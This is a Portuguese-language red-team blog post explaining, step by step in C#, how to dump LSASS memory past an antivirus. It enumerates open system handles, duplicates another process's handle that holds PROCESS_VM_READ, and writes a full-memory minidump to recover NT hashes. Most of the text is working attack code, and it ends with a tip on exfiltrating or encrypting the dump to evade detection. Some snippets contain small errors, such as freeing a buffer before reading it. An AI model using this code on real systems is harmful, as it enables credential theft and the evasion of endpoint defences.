---
title: "A reciclagem também está presente nos handles."
date: 2023-06-03 00:00:00 +0800
categories: [Windows, LSASS]
tags: [Red Team]
---

![Desktop View](https://i.imgur.com/A0bkoaS.png)

Como sabemos, o processo do LSASS é um tesouro quando se observado pelo lado ofensivo. É neste processo que informações de logons de usuários são armazenadas (como as valiosas NT hashes). Quando o assunto é dump de credenciais, um handle com permissões de `PROCESS_VM_READ¹` ao LSASS se torna tudo o que um atacante quer.

>`PROCESS_VM_READ¹`: permissão necessária para a leitura da memória (dump) de um processo. 
{: .prompt-info }

Nos últimos tempos, estive me aprofundando em técnicas de dump de LSASS que normalmente um EDR/XDR não detectaria. Em um laboratório, instalei um famoso antivírus do mercado (no qual não citarei o nome) e que me rendeu bastante trabalho. Quando eu abria um novo handle pro LSASS e tentava interagí-lo, um erro era retornado: `STATUS_ACCESS_DENIED`.

![Desktop View](https://i.imgur.com/wihqqna.png)

No código, primeiro é aberto um novo handle pro LSASS com o privilégio `PROCESS_CREATE_PROCESS²`. Como exibido na captura de tela acima, o erro ocorria na execução da API `NtCreateProcessEx³`.


```csharp
uint accessParentProcess = PROCESS_CREATE_PROCESS;
uint accessChildProcess = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ ;

IntPtr hParentProcess = OpenProcess((uint)accessParentProcess, false, Convert.ToUInt32(pid)); // abrindo um handle ao LSASS com PROCESS_CREATE_PROCESS

Console.WriteLine($"[+] Handle: {hParentProcess}");

int ningning = NtCreateProcessEx( // clonando o processo do LSASS
	out IntPtr hChildProcess,
	(uint)accessChildProcess,
	IntPtr.Zero,
	hParentProcess,
	0,
	IntPtr.Zero,
	IntPtr.Zero,
	IntPtr.Zero,
	false
);

if (ningning == 0)
{
	uint hChildPid = GetProcessId(hChildProcess);

	Console.WriteLine($"[^] Forked Handle: {hChildProcess}");
	Console.WriteLine($"[^] Forked PID: {hChildPid}");
}
```

>`PROCESS_CREATE_PROCESS²`: permissão necessária criar um fork (clone) de um processo alvo.
>`NtCreateProcessEx³`: API utilizada para criar um fork do processo LSASS. 
{: .prompt-info }

Note que foi solicitada a abertura de um novo handle ao LSASS na linha 4 do código. Nele, é especificado que será aberto com os privilégios de `PROCESS_CREATE_PROCESS`. Entretanto, como vimos, um erro de `ACCESS DENIED` é retornado.

Pausando a execução do código e partindo para a análise do handle recém-aberto utilizando o programa Process Hacker, nos deparamos com algo bastante interessante:

![Desktop View](https://i.imgur.com/RUkXM62.png)

Descobrimos o motivo do erro! Ao solicitar a abertura de um novo handle ao LSASS, antes dos privilégios serem atribuídos, o AV analisa as permissões que serão dadas e, dependendo delas, serão barradas e não atribuídas ao handle. No final, nenhuma permissão foi atribuída, ocasionando no erro.

![Desktop View](https://i.imgur.com/oAHfhBb.png){: width="300" height="100" }

## Handles também podem ser reciclados!

Como foi visto, não é possível solicitar a abertura de um handle ao LSASS sem que o AV barre a atribuição dos privilégios necessários para o dump. Mas, e se algum programa legítimo já tiver aberto um handle? A pergunta é facilmente respondida com o Process Hacker. Nele, uma funcionalidade que busca por handles filtrados pelo nome.

![Desktop View](https://i.imgur.com/gyyW0Vw.png)

Podemos notar que, de todos os handles abertos ao LSASS, dois são do tipo "processo" (que é o que nos interessa). Averiguando as caracteristicas do handle destacado em vermelho, uma boa notícia vem à tona: suas permissões!

![Desktop View](https://i.imgur.com/1RQOTf1.png)

Maravilha! Como mostrado acima, duas permissões estão atribuídas ao handle LSASS: `PROCESS_VM_READ` e `PROCESS_QUERY_INFORMATION⁴`. É exatamente esta primeira permissão que nos permite ler a memória do processo, técnica popularmente conhecida como "dump". Agora, vamos dar uma mergulhada no mundo das Windows API. =]

>`PROCESS_QUERY_INFORMATION⁴`: permissão necessária para descobrir certas informações sobre um processo, como token, código de saída e classe de prioridade.
{: .prompt-info }


## NtQuerySystemInformation⁵

>`NtQuerySystemInformation⁵`: API utilizada para enumerar todos os handles em abertos no sistema.
{: .prompt-info }

```csharp
public enum SYSTEM_INFORMATION_CLASS
{ SystemHandleInformation = 16 }

public struct SYSTEM_HANDLE_INFORMATION {
	public uint Count;
	public SYSTEM_HANDLE_TABLE_ENTRY_INFO Handle;
}

public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	public ushort UniqueProcessId;
	public byte HandleAttributes;
	public ushort HandleValue;
	public IntPtr Object;
	public uint GrantedAccess;
}

[DllImport("ntdll.dll")]
public static extern NTSTATUS NtQuerySystemInformation(
	[In]  SYSTEM_INFORMATION_CLASS SystemInformationClass,
	[Out] IntPtr SystemInformation,
	[In]  int SystemInformationLength,
	[In]  ref int ReturnLength
);
```

Esta é uma API fundamental para todo o processo. Ela é do tipo `NTSTATUS⁶` e pede alguns valores importantes. São eles:
- `SystemInformationClass`: uma tabela de valores sobre informações do sistema operacional. Neste caso, é necessário somente o valor `SystemHandleInformation⁷`, representado pelo número 16 em hexadecimal.

- `SystemInformation`: a saída da API. É um ponteiro que armazena as informações solicitadas. Neste caso, as informações dos handles em abertos.

- `SystemInformationLength`: o tamanho do buffer, em bytes, apontado pelo `SystemInformation`.

- `ReturnLength`: um ponteiro representando o local onde a função vai escrever o tamanho da informação solicitada pela API. Se o tamanho do `ReturnLength` for menor ou igual ao `SystemInformationLength`, a informação será escrita dentro do `SystemInformation`. Caso contrário, retorna o tamanho do buffer necessário para receber o resultado.

>`NTSTATUS⁶`: lista de valores que são representados como status code. Bastante utilizada em APIs.
>`SystemHandleInformation⁷`: um struct que armazenas as informações de handles em abertos do sistema.
{: .prompt-info }

O valor retornado pelo `SystemInformation` é um struct `SYSTEM_HANDLE_INFORMATION`, como visto no código. Nele, é retornado dois valores:
- Count: número de handles abertos.
- Handle: um struct `SYSTEM_HANDLE_TABLE_ENTRY_INFO` que armazena informações precisas sobre o handle, como PID, privilégios de acesso, entre outros.

Inicialmente, não sabemos o tamanho necessário para alocar devido à incerteza do tamanho da resposta que será atribuída ao `SystemInformation`. Caso o tamanho seja insuficiente, a API retorna o NTSTATUS de `STATUS_INFO_LENGTH_MISMATCH`.

Se o resultado for `STATUS_INFO_LENGTH_MISMATCH`, então mais memória deverá ser alocada para armazenar as informações. Logo, uma boa alternativa seria utilizar um loop que checa o resultado da API.

```csharp
var systemHandleInformation = new Netdump.Tables.SYSTEM_HANDLE_INFORMATION();

var systemInformationLength = Marshal.SizeOf(systemHandleInformation); // armazenando o tamanho do systemHandleInformation
var systemInformationPtr = Marshal.AllocHGlobal(systemInformationLength); // alocando memória ao systemInformationLength 

var resultLength = 0;

while ( Netdump.Invokes.NtQuerySystemInformation(
	Netdump.Tables.SYSTEM_INFORMATION_CLASS.SystemHandleInformation,
	systemInformationPtr,
	systemInformationLength,
	ref resultLength ) == Netdump.Tables.NTSTATUS.STATUS_INFO_LENGTH_MISMATCH )
{
	systemInformationLength = resultLength; // precisa ser do mesmo tamanho
	Marshal.FreeHGlobal(systemInformationPtr); // liberando memória
	systemInformationPtr = Marshal.AllocHGlobal(systemInformationLength); // atribuindo a nova memória baseada no valor do resultLength
	Console.WriteLine($"[!] (NtQuerySystemInformation) Alocando mais memória: {systemInformationLength}");
}
```
Quando sair do loop, memória suficiente já terá sido alocada e um NTSTATUS de `STATUS_SUCCESS` será retornado, simbolizando sucesso na chamada da API. Com isso, o ponteiro `systemInformationPtr` armazenará dois tipos de informações: o número de handles em aberto e informações sobre eles.

```csharp
var numberOfHandles = Marshal.ReadInt64(systemInformationPtr);

Console.WriteLine($"[+] Número de handles: {numberOfHandles}");
```

![Desktop View](https://i.imgur.com/DK8TlfC.png)

Feito isso, o próximo objetivo é analisar os handles que estão abertos e armazenados no `systemInformationPtr`. Não é uma tarefa tão fácil, já que precisamos acessar handle por handle e realizar uma consulta na tabela `SYSTEM_HANDLE_TABLE_ENTRY_INFO` para descobrirmos seu PID, por exemplo.

Para isso, é uma boa alternativa a criação de um dicionário que armazenará informações sobre os handles.
Posteriormente, um loop que passará por todos eles através do `numberOfHandles`. É neste loop que obteremos sobre seus respectivos PIDs e, depois, sobre seus níveis de acesso.

```csharp
public static void IterateHandles(long numberOfHandles, IntPtr systemInformationPtr)
{
	var handleEntryPtr = new IntPtr((long)systemInformationPtr + sizeof(long)); // apontando para o tamanho do numberOfHandles (primeiros 8 bytes)

	Dictionary<int, List<Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO>> handles = new(); // criando um dicionário

	for (var i = 0; i < numberOfHandles; i++) // percorrendo por todos os handles
	{
		var handleTableEntry = (Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(handleEntryPtr, typeof(Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO)); // variável acessando a tabela SYSTEM_HANDLE_TABLE_ENTRY_INFO

		handleEntryPtr = new IntPtr((long)handleEntryPtr + Marshal.SizeOf(handleTableEntry)); // avançando o ponteiro para a próxima entrada
		
		if (!handles.ContainsKey(handleTableEntry.UniqueProcessId)) // verificando o UniqueProcessId (PID) pelo SYSTEM_HANDLE_TABLE_ENTRY_INFO
		{
			handles.Add(handleTableEntry.UniqueProcessId, new List<Netdump.Tables.SYSTEM_HANDLE_TABLE_ENTRY_INFO>());
			// adicionando o PID se ele ainda não tiver catalogado no dicionário
		}

		handles[handleTableEntry.UniqueProcessId].Add(handleTableEntry);
}

Marshal.FreeHGlobal(systemInformationPtr);

Netdump.Invokes.CloseHandle(handleEntryPtr);
Netdump.Invokes.CloseHandle(systemInformationPtr);
```

Agora que as informações que precisamos estão armazenadas no dicionário, precisamos criar um `foreach` para acessarmos elas de uma por uma. As informações que analisaremos são somente duas: PID e AccessRights.

- AccessRights: privilégios de acesso do handle. Buscamos por handles que contenham `PROCESS_VM_READ`.

Como são muitos handles, com muitos PIDs diferentes, será criado um `if` para filtrar somente pelo PID que contém o handle pro LSASS (como foi visto pelo Process Hacker).

```csharp
public enum PROCESS_ACCESS : uint 
{
	// struct contendo algumas permissões de processos.
	// neste caso, precisamos somente da PROCESS_VM_READ, mas fica ao seu critério.
	PROCESS_TERMINATE = 0x0001,
	PROCESS_CREATE_THREAD = 0x0002,
	PROCESS_SET_SESSIONID = 0x0004,
	PROCESS_VM_OPERATION = 0x0008,
	PROCESS_VM_READ = 0x0010,
	PROCESS_VM_WRITE = 0x0020,
	PROCESS_DUP_HANDLE = 0x0040,
	PROCESS_CREATE_PROCESS = 0x0080,
	PROCESS_SET_QUOTA = 0x0100,
	PROCESS_SET_INFORMATION = 0x0200,
	PROCESS_QUERY_INFORMATION = 0x0400
}

foreach (var index in handles)
{
	foreach(var handleStruct in index.Value) // handleStruct = SYSTEM_HANDLE_TABLE_ENTRY_INFO
	{
		Netdump.Tables.PROCESS_ACCESS grantedAccess = (Netdump.Tables.PROCESS_ACCESS)handleStruct.GrantedAccess;
		if (grantedAccess.HasFlag(Netdump.Tables.PROCESS_ACCESS.PROCESS_VM_READ))
		{
			if (index.Key == 6020)
			{
				foreach (Netdump.Tables.PROCESS_ACCESS accessRight in Enum.GetValues(typeof(Netdump.Tables.PROCESS_ACCESS)))
				{
					Console.WriteLine($"O identificador do handle é: {handleStruct.HandleValue}. e seus privilégios são: {accessRight.ToString()}");

					// obs: neste caso, é bom criar um "if" filtrando pelo PROCESS_ACCESS de PROCESS_VM_READ
					// if (accessRight.ToString() == "PROCESS_VM_READ") ...
					// estou mostrando todas as permissões de todos os handles para fins demonstrativos
				}
			}
		}
	}
}
```

![Desktop View](https://i.imgur.com/J4yNvkg.png)

## NtDuplicateObject⁸

>`NtDuplicateObject⁸`: API utilizada para duplicar um handle alvo.
{: .prompt-info }

Com os identificadores dos handles (PID e AccessRights) em mãos, o próximo passo é duplicá-los para, posteriormente, interagirmos com eles. O processo de duplicação é bem simples, ainda mais quando se tem uma API própria para isso.

```csharp
[Flags]
public enum DUPLICATE_OPTION_FLAGS : uint
{
	CLOSE_SOURCE = 0x00000001,
	SAME_ACCESS = 0x00000002, // herda os privilégios de acessos do handle pai ao handle clonado
	SAME_ATTRIBUTES = 0x00000004 // herda os atributos do handle pai ao handle clonado

}

[DllImport("ntdll.dll")]
public static extern NTSTATUS NtDuplicateObject(
	IntPtr SourceProcessHandle,
	IntPtr SourceHandle,
	IntPtr TargetProcessHandle,
	out IntPtr TargetHandle,
	uint DesiredAccess,
	bool InheritHandle,
	DUPLICATE_OPTION_FLAGS Options
);
```

Para duplicar o handle, é necessário um privilégio essencial: `PROCESS_DUP_HANDLE⁹`. Feito isso, após a abertura de um novo handle ao processo alvo (o que foi destacado no Process Hacker), é realizada a chamada da API. Ela terá como resultado um novo handle, referenciado como `hDuplicate`, que será o duplicado. Mas, não se enganem, este handle não é necessariamente o do LSASS. :P

```csharp
uint acessOriginal = PROCESS_DUP_HANDLE; // setando privilégios de acesso
uint acessDuplicate = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ; // setando privilégios de acesso

IntPtr hRemoteProcess = Netdump.Invokes.OpenProcess((uint)acessOriginal, false, 6020); // abrindo um handle pro processo que contém o handle do LSASS
if (hRemoteProcess == IntPtr.Zero) { throw new Exception($"[-] OpenProcess: {Marshal.GetLastWin32Error()}"); }

IntPtr hObject = new IntPtr(handle.HandleValue);

Netdump.Tables.NTSTATUS result = Netdump.Invokes.NtDuplicateObject(
	hRemoteProcess, // handle do processo alvo
	hObject, // objeto do handle que será duplicado (serve como um identificador, é o HandleValue)
	new IntPtr(-1), // criação de um pseudo handle
	out IntPtr hDuplicate, // handle duplicado
	(uint)acessDuplicate, // privilégios de acesso do handle duplicado
	false, // herdar handles?
	Netdump.Tables.DUPLICATE_OPTION_FLAGS.SAME_ACCESS // mesmo nível de acesso do handle original
);

if (result == Netdump.Tables.NTSTATUS.STATUS_SUCCESS && hDuplicate != IntPtr.Zero)
{
	Console.WriteLine($"Handle duplicado! {hDuplicate}");
}

else { throw new Exception($"[-] NtDuplicateObject: {Marshal.GetLastWin32Error()}"); }

Netdump.Invokes.CloseHandle(hRemoteProcess);
Netdump.Invokes.CloseHandle(hDuplicate);
Netdump.Invokes.CloseHandle(hObject);
```

>`PROCESS_DUP_HANDLE⁹`: permissão necessária para duplicar um handle.
{: .prompt-info }

## NtQueryObject¹¹

>`NtQueryObject¹¹`: API utilizada para filtrar informações de um objeto.
{: .prompt-info }

Chegando aos passos finais, vamos filtrar o tipo de handle que está sendo duplicado. Existem diversas modalidades deles, como handles de: `Process`, `Keys`, `Files`, `Threads`, entre outros. O tipo de handle que precisamos é da categoria "Process". Dito isso, uma API que filtra por esse tipo de informação é a `NtQueryObject`.

```csharp
[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct OBJECT_TYPE_INFORMATION
{
	public UNICODE_STRING TypeName; // retorna o tipo do handle
}

public enum OBJECT_INFORMATION_CLASS : uint
{
	ObjectBasicInformation = 0,
	ObjectNameInformation = 1,
	ObjectTypeInformation = 2,
	ObjectAllTypesInformation = 3,
	ObjectHandleInformation = 4
}

[DllImport("ntdll.dll", SetLastError = true)]
public static extern NTSTATUS NtQueryObject(
	IntPtr Handle,
	Netdump.Tables.OBJECT_INFORMATION_CLASS ObjectInformationClass,
	IntPtr ObjectInformation,
	int ObjectInformationLength,
	ref int ReturnLength
);
```

>`OBJECT_INFORMATION_CLASS`: um enum que representa a categoria de informação que será retornado do objeto.
{: .prompt-info }
>`OBJECT_TYPE_INFORMATION`: um struct que representa o valor que será retornado do objeto.
{: .prompt-info }

> O struct  `OBJECT_TYPE_INFORMATION` só será utilizado depois da chamada ao `OBJECT_INFORMATION_CLASS`. O resultado deste será filtrado posteriormente pelo struct.
{: .prompt-warning }

Similarmente a API `NtQuerySystemInformation`, também não sabemos o tamanho do resultado que a função retornará.

```csharp
var objTypeInfo = new Netdump.Tables.OBJECT_TYPE_INFORMATION();
var ObjectInformationLength = Marshal.SizeOf(objTypeInfo);
var ObjectInformation = Marshal.AllocHGlobal(ObjectInformationLength);

var returnLength = 0;

while (Netdump.Invokes.NtQueryObject(
	hDuplicate,
	Netdump.Tables.OBJECT_INFORMATION_CLASS.ObjectTypeInformation,
	ObjectInformation,
	ObjectInformationLength,
	ref returnLength
) == Netdump.Tables.NTSTATUS.STATUS_INFO_LENGTH_MISMATCH)

{
	ObjectInformationLength = returnLength;
	Marshal.FreeHGlobal(ObjectInformation);
	ObjectInformation = Marshal.AllocHGlobal(ObjectInformationLength);
}
```

A lógica continua a mesma: a cada vez que a API retornar o erro de `STATUS_INFO_LENGTH_MISMATCH`, mais memória será alocada ao `ObjectInformationLength` até completar o valor necessário para cobrir a resposta da API.

```csharp
Marshal.FreeHGlobal(ObjectInformation);

// acessando a tabela OBJECT_TYPE_INFORMATION
objTypeInfo = (Netdump.Tables.OBJECT_TYPE_INFORMATION)Marshal.PtrToStructure(ObjectInformation, typeof(Netdump.Tables.OBJECT_TYPE_INFORMATION));

var objTypeInfoBuf = new byte[objTypeInfo.TypeName.Length];

Marshal.Copy(objTypeInfo.TypeName.Buffer, objTypeInfoBuf, 0, objTypeInfo.TypeName.Length);
// transferindo memórias, o valor de objTypeInfo.TypeName será copiado ao objTypeInfoBuf

string hexValue = "0x" + hDuplicate.ToString("X");

var typeHandle = Encoding.Unicode.GetString(objTypeInfoBuf);

if (typeHandle.Equals("Process", StringComparison.OrdinalIgnoreCase)) // checando se o handle é do tipo "Process"
{
	Console.WriteLine($"PID: {Netdump.Invokes.GetProcessId(hDuplicate)}. O handle {hexValue} é do tipo Process.");
}
```

No código acima, será acessado o valor `TypeName` de cada handle que está representado no valor `hDuplicate`. Caso o tipo do handle seja de "Process", o PID do processo e o identificador do handle é exibido.

![Desktop View](https://i.imgur.com/dCGSO4d.png)

## QueryFullProcessImageName¹²

>`QueryFullProcessImageName¹²`: API utilizada para descobrir o path do executável de um processo.
{: .prompt-info }

Partindo para a penúltima etapa, agora será necessário descobrir o caminho do executável que está sendo referenciado no `hDuplicate`. Para isso, a API `QueryFullProcessImageName` se faz presente para cumprir esta função. Esta API é útil para, futurarmente, filtrarmos pelo processo "lsass.exe", onde desde o início foi o nosso alvo.

```csharp
[DllImport("Kernel32.dll", CharSet = CharSet.Auto)]
public static extern bool QueryFullProcessImageName(
	[In] IntPtr hProcess, // handle do processo
	[In] uint dwFlags, // 0 = Win32 path
	[Out] StringBuilder lpExeName, // saída da api, o path do exe
	[In, Out] ref uint lpdwSize // tamanho do buffer do lpExeName
);
```

```csharp
var typeHandle = Encoding.Unicode.GetString(objTypeInfoBuf);

int buffer = 1024;

var fileNameBuilder = new StringBuilder(buffer);
uint bufferLength = (uint)fileNameBuilder.Capacity + 1;

if (typeHandle.Equals("Process", StringComparison.OrdinalIgnoreCase))
{
	var result = Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength);
	Console.WriteLine(fileNameBuilder.ToString());
}
```

Note, conforme exibido na figura abaixo, os caminhos dos executáveis dos diversos processos que estão passando pelo handle `hDuplicate`. Vale ressaltar que todos esses caminhos simbolizam um handle em aberto para cada um desses executáveis.

![Desktop View](https://i.imgur.com/mXJ4rvQ.png)

Agora, para filtrar o caminho pelo "lsass.exe", um simples `if`.

```csharp
if (pathExe.Equals("Process", StringComparison.OrdinalIgnoreCase))
{
	if (Netdump.Invokes.QueryFullProcessImageName(hDuplicate, 0, fileNameBuilder, ref bufferLength))
	{
		if (fileNameBuilder.ToString().EndsWith("lsass.exe"))
		{
			Console.WriteLine($"[+] {hexValue}, PID: {Netdump.Invokes.GetProcessId(hDuplicate)}, Path: {fileNameBuilder.ToString()}");
		}
	}
}
```

![Desktop View](https://i.imgur.com/Ykf8Jw0.png)

E, finalmente! Temos um handle pro LSASS! Vamos pausar a execução do código e ver as permissões que o handle possui. Se tudo estiver certo, o handle duplicado do LSASS terá herdado as mesmas permissões que o handle original (`PROCESS_QUERY_INFORMATION` e `PROCESS_VM_READ`).

![Desktop View](https://i.imgur.com/g8SRVNL.png)

## MiniDumpWriteDump¹³

>`MiniDumpWriteDump¹³`: API utilizada para realizar o dump de um processo. Comumente utilizada em ataques ao LSASS.
{: .prompt-info }

Maravilha! Depois de todos esses processos, finalmente possuímos um handle válido pro LSASS! E com permissões de leitura de memória! Agora, será possível realizar o dump do processo.

```csharp
[Flags]
public enum MiniDumpType
{
    MiniDumpWithFullMemory = 0x00000002
}

[DllImport("dbghelp.dll", SetLastError = true)]
public static extern bool MiniDumpWriteDump(
	IntPtr hProcess,
	int ProcessId,
	SafeHandle hFile,
	MiniDumpType DumpType,
	IntPtr ExceptionParam,
	IntPtr UserStreamParam,
	IntPtr CallbackParam
);

public static void CreateDumpFile(IntPtr hDuplicate)
{
	Console.WriteLine("\n[!] (MiniDumpWriteDump) Criando arquivo de despejo: .\\dump.dmp");

	var fs = new FileStream("dump.dmp", FileMode.Create);

	bool result = MiniDumpWriteDump(
		hDuplicate, // handle duplicado do LSASS
		0,
		fs.SafeFileHandle,
		MiniDumpType.MiniDumpWithFullMemory,
		IntPtr.Zero,
		IntPtr.Zero,
		IntPtr.Zero
);

if (result == true) { Console.WriteLine("[+] (MiniDumpWriteDump) Dump realizado com sucesso."); }

}
```

![Desktop View](https://i.imgur.com/OuBgCMV.png)

E, sucesso! O arquivo ".\dump.dmp" contém o dump do processo do LSASS. Nomes de usuários e suas respectivas hashes NT são de se esperar na leitura deste arquivo, que pode ser feita utilizando a ferramenta `pypykatz`.

> Uma boa prática para evasão seria de não armazenar o arquivo do dump puro no disco. Ao invés disso, enviá-lo a algum servidor de destino ou criptografar o conteúdo do dump antes de salvá-lo. Tais práticas evitam a detecção por assinatura de arquivos DMP do LSASS.
{: .prompt-tip }

## Conclusão

Durante nossa jornada, identificamos uma barreira na abertura de um handle ao LSASS feito pelo antivírus e, a partir desta barreira, buscamos compreender métodos alternativos que nos levasse ao nosso objetivo. Em nossa trajetória, percorremos desde o entendimento básico do ataque até ao íntimo do sistema operacional Windows. Variedades de conhecimentos foram abordados nesta leitura, tais como:

- Programação;
- Windows API;
- Ataques ao sistema operacional;
- Evasão de softwares de defesas.

É de se ressaltar que, ao término deste artigo, buscamos alcançar uma mentalidade primordial na segurança ofensiva: entender como ocorrem os ataques por de trás dos panos. Desde já, agradeço enormemente a leitura. Espero que tenha contribuído de alguma forma em novos conhecimentos. Abraços. =]

## Referências

<https://rastamouse.me/duplicating-handles-in-csharp/>

<https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation>

<https://malapi.io/winapi/NtDuplicateObject>

<https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryobject>

<https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-queryfullprocessimagenamea>

<https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump>
